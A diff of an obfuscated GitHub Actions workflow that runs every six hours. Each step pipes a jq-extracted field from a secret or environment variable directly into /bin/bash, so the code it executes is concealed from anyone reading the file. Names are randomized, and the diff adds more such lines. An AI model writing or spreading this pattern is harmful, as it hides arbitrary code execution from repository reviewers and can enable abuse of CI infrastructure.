@@ -1,20 +1,23 @@
 name: dingdude8761
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 1/6 * * *'
+    - cron: '13 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dingdude8761
         env:
-          lj936: ${{ secrets.lj936 }}
+          wxy93236: ${{ secrets.wxy93236 }}
         run: |
-          echo $lj936 | jq -r .dyzl43400 | /bin/bash
-          echo $hzyfp55592 | jq -r .aj8435 | /bin/bash
-          echo $p4 | jq -r .nidgv70 | /bin/bash
+          echo $wxy93236 | jq -r .t461 | /bin/bash
+          echo $nat6970 | jq -r .jacbu74 | /bin/bash
+          echo $ntq5414 | jq -r .wye016 | /bin/bash
+          echo $wx9 | jq -r .jmrxe41234 | /bin/bash
+          echo $gl082 | jq -r .g5294 | /bin/bash
+          echo $zokdh73 | jq -r .fyo66607 | /bin/bash
+          echo $s1 | jq -r .yxz1452 | /bin/bash
+          echo $g2923 | jq -r .hrys65550 | /bin/bash
 
